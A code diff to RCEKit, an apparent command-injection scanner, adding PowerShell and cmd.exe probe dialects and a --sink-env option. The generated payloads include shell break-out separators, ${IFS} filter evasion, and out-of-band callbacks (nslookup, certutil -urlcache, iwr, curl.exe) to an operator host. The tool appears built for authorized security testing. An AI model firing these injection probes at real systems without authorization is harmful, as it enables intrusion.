@@ -26,7 +26,7 @@ logger = logging.getLogger(__name__)
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "2.29.0"
+__version__ = "2.30.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 
@@ -64,18 +64,74 @@ NO_SEPARATOR_CONTEXTS = SELF_SEPARATING_CONTEXTS | SUBSTITUTION_CONTEXTS
 # contexts, so naming a rung narrows an already-supported run rather than
 # switching on a parallel code path.
 SINK_SHAPE_RUNGS = ("sep", "raw", "chain", "newline", "dq", "sq", "subshell")
-# Rungs that vary the command *separator* the probe breaks out with.
-SINK_SHAPE_SEPARATORS = {
-    "sep": ("; ",),
-    "chain": ("| ", "|| ", "&& "),
-    "newline": ("\n",),
+
+# The shell dialects a probe can be written for. `$((a+b))`, `$(echo TAG)` and
+# `sleep` are POSIX constructs: on a cmd.exe or PowerShell sink they are inert
+# literal text, so a probe written in one dialect and fired at another costs a
+# request and can only ever come back negative.
+SINK_ENVIRONMENTS = ("unix", "windows", "powershell")
+
+# Sink dialects whose filesystem paths use a backslash and whose delete command
+# is not `rm`.
+WINDOWS_PATH_SINK_ENVS = frozenset({"windows", "powershell"})
+
+# Break-out contexts that are POSIX syntax on a Unix shell and *also* valid
+# PowerShell: `'; ... #` closes the quote and comments the tail (PowerShell's
+# comment character is `#` too), and `$( )` is its subexpression operator.
+# Measured against pwsh 7.4. The backtick is deliberately absent: in PowerShell
+# it is the escape character, not a substitution, so that context is inert.
+POWERSHELL_BREAKOUT_CONTEXTS = frozenset({
+    "shell_single_quoted", "shell_double_quoted", "shell_subshell",
+})
+
+# Rungs that vary the command *separator* the probe breaks out with, per sink
+# dialect. A rung names the *role* ("chain the injected command onto the
+# running one"); which characters fill that role is the dialect's business.
+#
+# cmd.exe has no line-oriented separator, so `newline` contributes nothing.
+# PowerShell has no working pipe break-out: `cmd | Start-Sleep -Milliseconds N`
+# is a parameter-binding error, not a fresh command with stdin attached the way
+# a POSIX pipe is -- measured, and it fails the same way for every cmdlet the
+# probes use. `&&`/`||` exist from PowerShell 7 only; they are kept because
+# they are free when absent (a parse error on 5.1 costs the probe, not the run)
+# and `;`/newline carry the common case in both.
+SINK_SHAPE_SEPARATORS_BY_ENV = {
+    "unix": {
+        "sep": ("; ",),
+        "chain": ("| ", "|| ", "&& "),
+        "newline": ("\n",),
+    },
+    "windows": {
+        "sep": (" & ",),
+        "chain": (" | ", " || ", " && "),
+        "newline": (),
+    },
+    "powershell": {
+        "sep": ("; ",),
+        "chain": ("&& ", "|| "),
+        "newline": ("\n",),
+    },
 }
-# Rungs that vary the *context* the probe is wrapped in.
-SINK_SHAPE_CONTEXTS = {
-    "sq": ("shell_single_quoted",),
-    "dq": ("shell_double_quoted",),
-    "subshell": ("shell_subshell", "shell_backtick"),
+SINK_SHAPE_SEPARATORS = SINK_SHAPE_SEPARATORS_BY_ENV["unix"]
+
+# Rungs that vary the *context* the probe is wrapped in, per sink dialect.
+# cmd.exe has neither a comment character to swallow the sink's tail nor a
+# command-substitution syntax, so none of these three rungs has a shape it can
+# execute there and the carriers for them are not built at all.
+SINK_SHAPE_CONTEXTS_BY_ENV = {
+    "unix": {
+        "sq": ("shell_single_quoted",),
+        "dq": ("shell_double_quoted",),
+        "subshell": ("shell_subshell", "shell_backtick"),
+    },
+    "windows": {},
+    "powershell": {
+        "sq": ("shell_single_quoted",),
+        "dq": ("shell_double_quoted",),
+        "subshell": ("shell_subshell",),
+    },
 }
+SINK_SHAPE_CONTEXTS = SINK_SHAPE_CONTEXTS_BY_ENV["unix"]
 
 
 # Methods that cost one response per probe. The rest sleep (time) or wait for a
@@ -89,10 +145,57 @@ CHEAP_DETECTION_METHODS = {"reflected", "eval"}
 SHELL_PROBE_METHODS = {"reflected", "file", "time", "oob"}
 
 
+def parse_sink_env(value: Optional[str]) -> Optional[str]:
+    """``--sink-env`` -> the dialect to write every probe in, or ``None`` for
+    ``auto`` (infer it per carrier).
+
+    Raises ``ValueError`` naming the offending value, so a typo is refused
+    rather than silently falling back to the POSIX shape -- which is the one
+    outcome an operator who reached for this flag is trying to avoid."""
+    if not value:
+        return None
+    value = value.strip().lower()
+    if value == "auto":
+        return None
+    if value not in SINK_ENVIRONMENTS:
+        raise ValueError(f"unknown sink environment: {value}; "
+                         f"choose from auto, {', '.join(SINK_ENVIRONMENTS)}")
+    return value
+
+
+def sink_env_for(record: "PayloadRecord", config: Dict[str, Any]) -> str:
+    """Which shell dialect a carrier's probes must be written in.
+
+    ``--sink-env`` is the operator stating what runs the injected command, and
+    it wins outright: the corpus environment names the application runtime, not
+    the OS underneath it, so a PHP or Java application on Windows is a case the
+    inference below cannot see and the operator can.
+
+    Otherwise it is derived from the carrier, and the *context* speaks first
+    where it names a shell. That ordering is what makes the extra carriers built
+    for a dialect stay in that dialect: a ``powershell`` carrier that grows a
+    ``'; ... #`` break-out must still be judged PowerShell, and re-deriving from
+    the environment alone would hand those probes to cmd.exe -- which was
+    exactly the measured defect here. Every ``windows`` carrier used to take the
+    cmd core, so the run's one explicitly PowerShell-shaped carrier was written
+    in a dialect it cannot execute."""
+    explicit = config.get("sink_env")
+    if explicit:
+        return str(explicit)
+    if record.context == "powershell":
+        return "powershell"
+    if record.context == "windows_cmd":
+        return "windows"
+    if record.environment == "windows":
+        return ("powershell" if record.context in POWERSHELL_BREAKOUT_CONTEXTS
+                else "windows")
+    return "unix"
+
+
 def effective_sink_shapes(config: Dict[str, Any]) -> Tuple[str, ...]:
     """The rungs a run will *actually* try, after every narrowing in play.
 
-    ``--sink-shape`` is the operator's stated choice, but three other flags
+    ``--sink-shape`` is the operator's stated choice, but four other flags
     narrow it, and the pre-flight plan is presented as an audit of the traffic
     about to be sent -- so it has to be computed from the effective state rather
     than from the raw flag, or it describes a run that will not happen.
@@ -111,6 +214,17 @@ def effective_sink_shapes(config: Dict[str, Any]) -> Tuple[str, ...]:
         # An explicit --contexts suppresses the added quote/substitution
         # carriers, so those rungs never get a carrier to ride on.
         selected -= set(SINK_SHAPE_CONTEXTS)
+    sink_env = config.get("sink_env")
+    if sink_env:
+        # A pinned dialect rules out the rungs it has no syntax for -- cmd.exe
+        # has no comment character, no substitution and no line separator, so
+        # printing those rungs would describe requests that will not be sent.
+        # Only knowable up front when the dialect is pinned; under `auto` it is
+        # a per-carrier answer.
+        selected &= (set(SINK_SHAPE_CONTEXTS_BY_ENV.get(sink_env, {}))
+                     | {rung for rung, seps in
+                        SINK_SHAPE_SEPARATORS_BY_ENV.get(sink_env, {}).items() if seps}
+                     | {"raw"})
     return tuple(rung for rung in SINK_SHAPE_RUNGS if rung in selected)
 
 
@@ -1956,7 +2070,14 @@ class RCEKit:
         the one case a quoted break-out loses to a filter on the quote itself.
 
         Which contexts are added follows ``--sink-shape``, so naming a rung
-        narrows this rather than bypassing it.
+        narrows this rather than bypassing it. It follows the carrier's *sink
+        dialect* too: cmd.exe has no comment character to swallow the sink's
+        tail and no command-substitution syntax, so all three of these rungs
+        were previously built for it as payloads it cannot execute -- four
+        carriers' worth of requests per Windows run that could only ever come
+        back negative. PowerShell takes the quote break-outs and ``$( )`` but
+        not the backtick, which is its escape character rather than a
+        substitution.
 
         Skipped when the operator named ``--contexts`` explicitly -- a narrowed
         run is a deliberate choice about what to send, and widening it behind
@@ -1964,15 +2085,48 @@ class RCEKit:
         if config.get("contexts_explicit"):
             return []
         shapes = config.get("sink_shapes")
-        wanted: List[str] = []
-        for rung in SINK_SHAPE_RUNGS:
-            if rung in SINK_SHAPE_CONTEXTS and (not shapes or rung in shapes):
-                wanted.extend(SINK_SHAPE_CONTEXTS[rung])
         extra: List[PayloadRecord] = []
         for record in list(carriers):
             if record.environment not in SHELL_CAPABLE_ENVIRONMENTS:
                 continue
-            for context in wanted:
+            table = SINK_SHAPE_CONTEXTS_BY_ENV.get(sink_env_for(record, config), {})
+            for rung in SINK_SHAPE_RUNGS:
+                if rung not in table or (shapes and rung not in shapes):
+                    continue
+                for context in table[rung]:
+                    key = (record.environment, context)
+                    if key in carrier_seen:
+                        continue
+                    carrier_seen.add(key)
+                    extra.append(dataclass_replace(record, context=context))
+        return extra
+
+    @staticmethod
+    def _windows_dialect_carriers(carriers: List[PayloadRecord],
+                                  carrier_seen: Set[Tuple[str, str]],
+                                  config: Dict[str, Any]) -> List[PayloadRecord]:
+        """cmd.exe and PowerShell carriers for the runtimes that are Windows-first.
+
+        ``dotnet`` reaches a shell (``Process.Start``) like every other runtime
+        in ``SHELL_CAPABLE_ENVIRONMENTS``, and every one of them takes the Unix
+        shape because a language runtime does not say which OS it runs on. For
+        .NET that default is backwards: the corpus ships a ``dotnet``
+        environment precisely because the application is a Windows one often
+        enough to be worth naming, and it was the one runtime whose probes could
+        never confirm on the platform it is most associated with.
+
+        Two extra carriers, not a third dialect for every runtime: the Unix
+        shape stays (ASP.NET Core on Linux is real), and an operator who knows
+        the OS says so with ``--sink-env`` rather than paying for both. Skipped
+        when the dialect is pinned -- the operator has already answered this --
+        and when ``--contexts`` narrows the run by hand."""
+        if config.get("sink_env") or config.get("contexts_explicit"):
+            return []
+        extra: List[PayloadRecord] = []
+        for record in list(carriers):
+            if record.environment != "dotnet":
+                continue
+            for context in ("windows_cmd", "powershell"):
                 key = (record.environment, context)
                 if key in carrier_seen:
                     continue
@@ -2043,6 +2197,10 @@ class RCEKit:
                 continue
             carrier_seen.add(key)
             carriers.append(record)
+        # Dialect carriers first: they are ordinary carriers, so the quoted /
+        # substitution break-outs are then offered to them on the same terms as
+        # to every other carrier rather than being a shape only Unix ever gets.
+        carriers.extend(self._windows_dialect_carriers(carriers, carrier_seen, config))
         carriers.extend(self._quoted_shell_carriers(carriers, carrier_seen, config))
         return carriers
 
@@ -2841,9 +2999,18 @@ class DetectionMethod:
     DEFAULT_SEPARATORS = {
         "unix": ("; ", "| ", "|| ", "&& ", "\n"),
         "windows": (" & ", " | ", " || ", " && "),
+        # No pipe: PowerShell's `|` binds the previous command's output to the
+        # injected cmdlet's parameters, and every cmdlet these probes use
+        # rejects that binding, so the injected command never runs. `;` and the
+        # newline work on every version; `&&`/`||` need PowerShell 7.
+        "powershell": ("; ", "\n", "&& ", "|| "),
     }
 
-    def _separators(self, windows: bool) -> Tuple[str, ...]:
+    def _sink_env(self, record: "PayloadRecord") -> str:
+        """The shell dialect this carrier's probes are written in."""
+        return sink_env_for(record, self.config)
+
+    def _separators(self, sink_env: str = "unix") -> Tuple[str, ...]:
         """The separators to sweep.
 
         ``--separators`` is the explicit, lowest-level control and still wins
@@ -2853,30 +3020,22 @@ class DetectionMethod:
         left are ones that supply their own way into the shell, so a
         separator-led probe would be a request that cannot confirm.
 
-        Windows keeps its own table. Its separators are genuinely different
-        (``&`` and ``&&`` work, ``;`` does not), so a rung name maps to the
-        environment's own vocabulary rather than to a global one."""
+        Each dialect keeps its own table. Their separators are genuinely
+        different — cmd.exe takes ``&`` and not ``;``, PowerShell takes ``;``
+        and not a pipe — so a rung name maps to the dialect's own vocabulary
+        rather than to a global one."""
         configured = self.config.get("separators")
         if configured:
             return tuple(configured)
-        table = self.DEFAULT_SEPARATORS["windows" if windows else "unix"]
+        table = self.DEFAULT_SEPARATORS.get(sink_env, self.DEFAULT_SEPARATORS["unix"])
         shapes = self.config.get("sink_shapes")
         if not shapes:
             return table
-        if windows:
-            # Map the rungs onto cmd.exe's vocabulary by position of meaning:
-            # 'sep' is its plain chainer, 'chain' its pipes/conditionals. cmd
-            # has no line-oriented separator, so 'newline' contributes nothing.
-            windows_rungs = {"sep": (" & ",), "chain": (" | ", " || ", " && "), "newline": ()}
-            selected: List[str] = []
-            for rung in SINK_SHAPE_RUNGS:
-                if rung in shapes:
-                    selected.extend(windows_rungs.get(rung, ()))
-            return tuple(dict.fromkeys(selected))
-        selected = []
+        rungs = SINK_SHAPE_SEPARATORS_BY_ENV.get(sink_env, SINK_SHAPE_SEPARATORS)
+        selected: List[str] = []
         for rung in SINK_SHAPE_RUNGS:
             if rung in shapes:
-                selected.extend(SINK_SHAPE_SEPARATORS.get(rung, ()))
+                selected.extend(rungs.get(rung, ()))
         return tuple(dict.fromkeys(selected))
 
     def _needs_separator(self, record: "PayloadRecord") -> bool:
@@ -2910,7 +3069,7 @@ class DetectionMethod:
         return "raw" in effective_sink_shapes(self.config)
 
     def _separator_candidates(self, record: "PayloadRecord",
-                              windows: bool) -> Tuple[Optional[str], ...]:
+                              sink_env: str = "unix") -> Tuple[Optional[str], ...]:
         """The separators to build one probe each for; ``None`` means "none".
 
         Every method that builds a probe per separator goes through here, which
@@ -2923,12 +3082,12 @@ class DetectionMethod:
         tested nothing reading as "not vulnerable"."""
         if not self._needs_separator(record):
             return (None,)
-        candidates: List[Optional[str]] = list(self._separators(windows))
+        candidates: List[Optional[str]] = list(self._separators(sink_env))
         if self._raw_rung_selected():
             candidates.append(None)
         return tuple(candidates)
 
-    def _wrap_variants(self, record: "PayloadRecord", core: str, windows: bool = False,
+    def _wrap_variants(self, record: "PayloadRecord", core: str, sink_env: str = "unix",
                        evade: bool = True, terminate: bool = False) -> List[str]:
         """One ready-to-send payload per candidate separator: break out of the
         running command, then escape for the record's serialization context —
@@ -2949,11 +3108,13 @@ class DetectionMethod:
             # something on, and a redirect or a pipe there swallows the probe's
             # output entirely -- the probe executes and still reads as negative.
             #
-            # Only for an unquoted Unix context: cmd.exe has no '#' comment, and
-            # a context that closes with its own suffix would put the suffix
-            # after the '#' and comment it out instead.
+            # cmd.exe has no '#' comment, so the shape is skipped there; a
+            # PowerShell sink does take it ('#' comments to end of line in
+            # PowerShell too -- measured). A context that closes with its own
+            # suffix would put the suffix after the '#' and comment it out
+            # instead, so it is skipped in every dialect.
             ctx = self.gen.contexts.get(record.context, {})
-            if windows or ctx.get("suffix"):
+            if sink_env == "windows" or ctx.get("suffix"):
                 return []
             core = f"{core} #"
         # One body per candidate, where a `None` candidate is the `raw` rung:
@@ -2963,24 +3124,24 @@ class DetectionMethod:
         # suspected its shape -- a false negative that took prior knowledge to
         # avoid.
         bodies = [core if separator is None else f"{separator}{core}"
-                  for separator in self._separator_candidates(record, windows)]
+                  for separator in self._separator_candidates(record, sink_env)]
         payloads: List[str] = []
         for body in bodies:
-            if evade and not windows and self.config.get("evade") == "low":
+            if evade and sink_env == "unix" and self.config.get("evade") == "low":
                 body = body.replace(" ", "${IFS}")
             if self._context_swallows(record, body):
                 continue
             payloads.append(self._wrap_context(record, body))
         return payloads
 
-    def _wrap(self, record: "PayloadRecord", core: str, windows: bool = False,
+    def _wrap(self, record: "PayloadRecord", core: str, sink_env: str = "unix",
               evade: bool = True) -> str:
         """The first :meth:`_wrap_variants` payload — one separator only.
 
         For methods that cannot sweep: an aggregate method reads a whole probe
         series as one measurement, so mixing separators through it would blend
         a working break-out with broken ones and destroy the signal."""
-        return self._wrap_variants(record, core, windows, evade)[0]
+        return self._wrap_variants(record, core, sink_env, evade)[0]
 
     def _space_free_bodies(self, record: "PayloadRecord",
                            core: str) -> List[Tuple[Optional[str], str]]:
@@ -2992,7 +3153,7 @@ class DetectionMethod:
         newline separator is kept as-is: it is not a space, and a sink that
         strips spaces still passes it through."""
         pairs: List[Tuple[Optional[str], str]] = []
-        for separator in self._separator_candidates(record, windows=False):
+        for separator in self._separator_candidates(record, "unix"):
             if separator is None:
                 # The raw rung. A space-filtering sink can also be a
                 # whole-command sink; the two filters are unrelated.
@@ -3056,7 +3217,13 @@ class ReflectedMath(DetectionMethod):
     the literal ``$((a+b))``, never the sum. Two independent proofs ride in one
     Unix probe — (1) arithmetic on random operands, and (2) a ``$(echo TAG)``
     substitution collapse that proves the shell *ran* the substitution rather
-    than echoing it."""
+    than echoing it.
+
+    The core is written in the carrier's own dialect (see :func:`sink_env_for`).
+    ``$(( ))`` is POSIX syntax and inert text on Windows, so cmd.exe gets
+    ``set /a`` through a ``for /f`` capture and PowerShell gets its ``$( )``
+    subexpression — otherwise the two OS families the corpus generates payloads
+    for are families this method cannot confirm on."""
     name = "reflected"
     tier = "confirmed"
 
@@ -3069,13 +3236,42 @@ class ReflectedMath(DetectionMethod):
         total = a + b
         t1, t2, t3 = self._tag(rng), self._tag(rng), self._tag(rng)
         probes: List[Probe] = []
-        if record.environment == "windows":
+        sink_env = self._sink_env(record)
+        if sink_env == "windows":
             # `set /a` is cmd.exe's arithmetic builtin; `for /f` captures its
             # output so the computed value lands in the response.
             arith = f"set /a {a}+{b}"
             core = f'for /f "delims=" %i in (\'{arith}\') do @echo {t1}%i{t2}'
             probes.extend(Probe(payload=payload, expected=f"{t1}{total}{t2}", forbidden=arith)
-                          for payload in self._wrap_variants(record, core, windows=True))
+                          for payload in self._wrap_variants(record, core, "windows"))
+        elif sink_env == "powershell":
+            # `$( )` is PowerShell's subexpression operator, and an unquoted
+            # argument is an expandable string -- so `RK1$(a*b)RK2` is one
+            # bareword that comes back with the product spliced in, with no
+            # quote character anywhere in the probe. That matters: a quote in
+            # the body is what stops the quote-wrapping contexts from carrying a
+            # shape at all (see _context_swallows).
+            #
+            # A product rather than a sum, and multiplied locally: reflection
+            # returns the literal `$(a*b)`, never the 11-digit product.
+            product = a * b
+            expr = f"$({a}*{b})"
+            core = f"Write-Output {t1}{expr}{t2}"
+            probes.extend(Probe(payload=payload, expected=f"{t1}{product}{t2}", forbidden=expr)
+                          for payload in self._wrap_variants(record, core, "powershell"))
+            if self._depth() != "quick":
+                # Same proof with the sink's tail commented out, and without
+                # naming a cmdlet at all: a bare expandable string is a
+                # statement whose value PowerShell writes to the output stream,
+                # so it survives a filter on `Write-Output`/`echo`.
+                probes.extend(
+                    Probe(payload=payload, expected=f"{t1}{product}{t2}", forbidden=expr)
+                    for payload in self._wrap_variants(record, core, "powershell",
+                                                       terminate=True))
+                bare = f'"{t1}{expr}{t2}"'
+                probes.extend(
+                    Probe(payload=payload, expected=f"{t1}{product}{t2}", forbidden=expr)
+                    for payload in self._wrap_variants(record, bare, "powershell"))
         else:
             # $(( )) arithmetic + $() substitution collapse, one probe.
             arith = f"$(({a}+{b}))"
@@ -3217,19 +3413,31 @@ class FileBased(DetectionMethod):
         if channel is None:
             return []
         write_root, read_template = channel
-        windows = record.environment == "windows"
-        write_root = write_root.rstrip("\\") if windows else write_root.rstrip("/")
+        sink_env = self._sink_env(record)
+        windows_paths = sink_env in WINDOWS_PATH_SINK_ENVS
+        write_root = write_root.rstrip("\\") if windows_paths else write_root.rstrip("/")
         probes: List[Probe] = []
         # One filename and token per separator. Sharing them would make every
         # probe's followup succeed as soon as any one separator wrote the file,
         # so a confirmation could not say which break-out actually worked -- and
         # its cleanup command would name a file another probe wrote.
-        for separator in self._separator_candidates(record, windows):
+        for separator in self._separator_candidates(record, sink_env):
             name = "rcekit-" + "".join(rng.choice(string.ascii_lowercase + string.digits)
                                        for _ in range(12)) + ".txt"
             token = self._tag(rng) + "".join(rng.choice(string.ascii_uppercase + string.digits)
                                              for _ in range(10))
-            if windows:
+            if sink_env == "powershell":
+                write_path = f"{write_root}\\{name}"
+                # Set-Content, not `>`: in Windows PowerShell 5.1 the redirect
+                # is Out-File, whose default encoding is UTF-16LE, and a
+                # token written as UTF-16 is not the byte sequence the read-back
+                # searches for -- the write would land and the probe would still
+                # read as negative. Set-Content's default is a single-byte
+                # encoding on 5.1 and UTF-8 on 7, both of which the read-back
+                # finds.
+                core = f"Set-Content -Path {write_path} -Value {token}"
+                cleanup = f"Remove-Item -Force {write_path}"
+            elif windows_paths:
                 write_path = f"{write_root}\\{name}"
                 core = f"echo {token}>{write_path}"
                 cleanup = f"del {write_path}"
@@ -3308,10 +3516,16 @@ class ParametricTime(DetectionMethod):
     def applicable(self, record: "PayloadRecord") -> bool:
         return record.environment in SHELL_CAPABLE_ENVIRONMENTS
 
-    def _sleep_core(self, delay: float, windows: bool) -> str:
-        if windows:
+    def _sleep_core(self, delay: float, sink_env: str = "unix") -> str:
+        if sink_env == "windows":
             # `ping -n k` waits ~(k-1)s; +1 so d=0 is a single instant ping.
             return f"ping 127.0.0.1 -n {int(round(delay)) + 1} >nul"
+        if sink_env == "powershell":
+            # Milliseconds rather than -Seconds: the regression fires at 0, base
+            # and 2*base, and a fractional --time-base would be truncated to an
+            # integer second, collapsing two of the three levels onto each other
+            # and leaving nothing for the slope to be measured from.
+            return f"Start-Sleep -Milliseconds {int(round(delay * 1000))}"
         return f"sleep {delay:g}"
 
     def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
@@ -3321,7 +3535,7 @@ class ParametricTime(DetectionMethod):
         self._record = record
         self._rng = rng
         base = float(self.config.get("time_base", 2.0))
-        windows = record.environment == "windows"
+        sink_env = self._sink_env(record)
         # Every candidate separator is screened at both probe depths. Narrowing
         # this to the first one is the cheapest-looking saving here and the most
         # expensive: it puts back the ';'-only blind spot the screen exists to
@@ -3329,37 +3543,37 @@ class ParametricTime(DetectionMethod):
         # and only for the operator who chose 'quick' to be gentle on a
         # rate-limited target. --probe-depth trades probe *shapes* for requests;
         # it does not trade away a break-out this method cannot detect without.
-        separators = self._separator_candidates(record, windows)
+        separators = self._separator_candidates(record, sink_env)
         # Screen in two waves. Each delayed screen probe costs a real sleep, so
         # screening all five separators up front spent `5 x base` seconds on
         # every carrier -- including the carriers that can never break out at
         # all. The first wave is the two separators that work on the large
         # majority of sinks; the rest are only screened if neither delayed.
         self._pending_separators = tuple(separators[self.SCREEN_FIRST_WAVE:])
-        return self._screen_probes(record, separators[:self.SCREEN_FIRST_WAVE], base, windows, rng)
+        return self._screen_probes(record, separators[:self.SCREEN_FIRST_WAVE], base, sink_env, rng)
 
     def _screen_probes(self, record: "PayloadRecord", separators, base: float,
-                       windows: bool, rng: "random.Random") -> List[Probe]:
+                       sink_env: str, rng: "random.Random") -> List[Probe]:
         """A paired 0s/base probe per separator. The pair is what keeps a
         uniformly slow endpoint from reading as a break-out."""
-        probes = [Probe(payload=self._payload(record, 0.0, sep, windows), expected="",
+        probes = [Probe(payload=self._payload(record, 0.0, sep, sink_env), expected="",
                         delay_s=0.0, separator=sep, phase="screen")
                   for sep in separators]
-        probes += [Probe(payload=self._payload(record, base, sep, windows), expected="",
+        probes += [Probe(payload=self._payload(record, base, sep, sink_env), expected="",
                          delay_s=base, separator=sep, phase="screen")
                    for sep in separators]
         rng.shuffle(probes)
         return probes
 
     def _payload(self, record: "PayloadRecord", delay: float, separator: Optional[str],
-                 windows: bool) -> str:
-        body = self._sleep_core(delay, windows)
+                 sink_env: str = "unix") -> str:
+        body = self._sleep_core(delay, sink_env)
         if separator is not None:
             body = f"{separator}{body}"
         # Same low-touch transform, applied to the whole body (separator
         # included) exactly as _wrap_variants does it, so the two paths cannot
         # drift apart.
-        if self.config.get("evade") == "low" and not windows:
+        if self.config.get("evade") == "low" and sink_env == "unix":
             body = body.replace(" ", "${IFS}")
         return self._wrap_context(record, body)
 
@@ -3371,7 +3585,7 @@ class ParametricTime(DetectionMethod):
             return []
         base = float(self.config.get("time_base", 2.0))
         repeats = max(1, int(self.config.get("time_repeats", 3)))
-        windows = self._record.environment == "windows"
+        sink_env = self._sink_env(self._record)
         quick = {}
         slow = {}
         for probe, obs in series:
@@ -3389,7 +3603,7 @@ class ParametricTime(DetectionMethod):
             # sink that filters ';' and '|' is exactly the case the sweep is for.
             pending, self._pending_separators = self._pending_separators, ()
             if pending:
-                return self._screen_probes(self._record, pending, base, windows, self._rng)
+                return self._screen_probes(self._record, pending, base, sink_env, self._rng)
             return []
         best = max(candidates, key=lambda sep: gains[sep])
         self._separator = best
@@ -3397,7 +3611,7 @@ class ParametricTime(DetectionMethod):
         for multiplier in (0, 1, 2):
             delay = base * multiplier
             for _ in range(repeats):
-                probes.append(Probe(payload=self._payload(self._record, delay, best, windows),
+                probes.append(Probe(payload=self._payload(self._record, delay, best, sink_env),
                                     expected="", delay_s=delay, separator=best, phase="regress"))
         # Randomise the fire order so the injected delay is decorrelated from the
         # request index, which is what makes the drift term below identifiable.
@@ -3609,7 +3823,7 @@ class OobCallback(DetectionMethod):
     def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
         host = str(self.config["oob_host"]).strip().rstrip(".")
         http_port = int(self.config.get("oob_http_port") or 80)
-        windows = record.environment == "windows"
+        sink_env = self._sink_env(record)
         port_suffix = "" if http_port == 80 else f":{http_port}"
         # A bare IP cannot carry a token as a DNS label -- there is nothing to
         # delegate and `<token>.10.0.0.1` resolves nowhere -- so the token rides
@@ -3623,7 +3837,7 @@ class OobCallback(DetectionMethod):
 
         listener = self.config.get("oob_listener")
 
-        separators = self._separator_candidates(record, windows)
+        separators = self._separator_candidates(record, sink_env)
 
         def add(core_for_token, label: str):
             # A token per *separator*, not per shape. Sharing one token across
@@ -3634,7 +3848,8 @@ class OobCallback(DetectionMethod):
                 token = self._token(rng)
                 core = core_for_token(token)
                 body = core if separator is None else f"{separator}{core}"
-                # The PowerShell shape carries double quotes, so a context that
+                # The cmd.exe `powershell -c "..."` shape carries double quotes,
+                # so a context that
                 # wraps the payload in them cannot execute it.
                 if self._context_swallows(record, body):
                     continue
@@ -3654,11 +3869,25 @@ class OobCallback(DetectionMethod):
             authority = host if ip_host else f"{token}.{host}"
             return f"http://{authority}{port_suffix}/{token}"
 
-        if windows:
+        if sink_env == "windows":
             if not ip_host:
                 add(lambda t: f"nslookup {t}.{host}", "dns/nslookup")
             add(lambda t: f"certutil -urlcache -f {url_for(t)} %TEMP%\\{t}", "http/certutil")
             add(lambda t: f"powershell -c \"iwr -useb {url_for(t)}\"", "http/powershell")
+        elif sink_env == "powershell":
+            # Already in PowerShell, so `iwr` is called directly rather than
+            # through a nested `powershell -c "..."` -- which is what the
+            # cmd.exe shape needs and what puts the double quotes in it. Without
+            # them this shape fits the quote-wrapping contexts too.
+            if not ip_host:
+                # nslookup, not Resolve-DnsName: the cmdlet lives in a
+                # Windows-only module that a hardened or Core host may not have,
+                # while nslookup is an executable present on every Windows
+                # install and already proven by the cmd.exe shape.
+                add(lambda t: f"nslookup {t}.{host}", "dns/nslookup")
+            add(lambda t: f"iwr -useb {url_for(t)}", "http/iwr")
+            if self._depth() != "quick":
+                add(lambda t: f"curl.exe -s {url_for(t)}", "http/curl")
         else:
             if not ip_host:
                 # DNS first: the resolver is the channel most likely to be open
@@ -4657,6 +4886,15 @@ def main():
                              "command; sq/dq break out of a surrounding quote; subshell reaches a "
                              "quoted value through $(...) and backticks without closing the quote. "
                              "Narrow it to cut request count once the sink's shape is known.")
+    parser.add_argument("--sink-env", default=None, metavar="ENV",
+                        help="(--methods) Which shell runs the injected command: "
+                             f"auto (default) or one of {', '.join(SINK_ENVIRONMENTS)}. "
+                             "The computed-value core, the separators and the break-out "
+                             "contexts are all dialect-specific -- $((a+b)) and sleep are inert "
+                             "text on cmd.exe, and PowerShell has no pipe break-out -- so a probe "
+                             "written for the wrong shell cannot confirm. auto infers it from each "
+                             "carrier; pin it when the corpus environment names the application "
+                             "runtime rather than the OS (e.g. a PHP or Java app on Windows).")
     parser.add_argument("--sink-blind", action="store_true", default=None,
                         help="Sink returns no output: keep only out-of-band confirmable payloads (timing/OOB)")
     parser.add_argument("--sink-decodes", nargs="+", default=None,
@@ -4721,6 +4959,7 @@ def main():
     sink_raw = bool(from_profile(args.sink_raw, "sink_raw"))
     try:
         sink_shapes = parse_sink_shapes(from_profile(args.sink_shape, "sink_shape"))
+        sink_env = parse_sink_env(from_profile(args.sink_env, "sink_env"))
     except ValueError as exc:
         print(f"[!] {exc}")
         return 1
@@ -5027,7 +5266,8 @@ def main():
                                 "file_read_url": args.file_read_url,
                                 "time_base": args.time_base, "evade": args.evade,
                                 "sink_raw": sink_raw, "separators": separators,
-                                "sink_shapes": sink_shapes, "eval_engines": eval_engines,
+                                "sink_shapes": sink_shapes, "sink_env": sink_env,
+                                "eval_engines": eval_engines,
                                 "probe_depth": args.probe_depth,
                                 "contexts_explicit": bool(selected_contexts),
                                 "oob_host": args.oob_host,
@@ -5101,8 +5341,9 @@ def main():
                 # one about to happen. This output is an audit or it is noise.
                 effective = effective_sink_shapes(detection_config)
                 narrowed = (sink_shapes is not None or sink_raw or separators
-                            or bool(selected_contexts))
+                            or sink_env or bool(selected_contexts))
                 label = ", ".join(effective) if narrowed else "auto (full ladder)"
+                print(f"[detect] sink shell: {sink_env or 'auto (per carrier)'}")
                 print(f"[detect] sink shapes: {label}")
                 for line in sink_shape_plan(effective):
                     print(line)
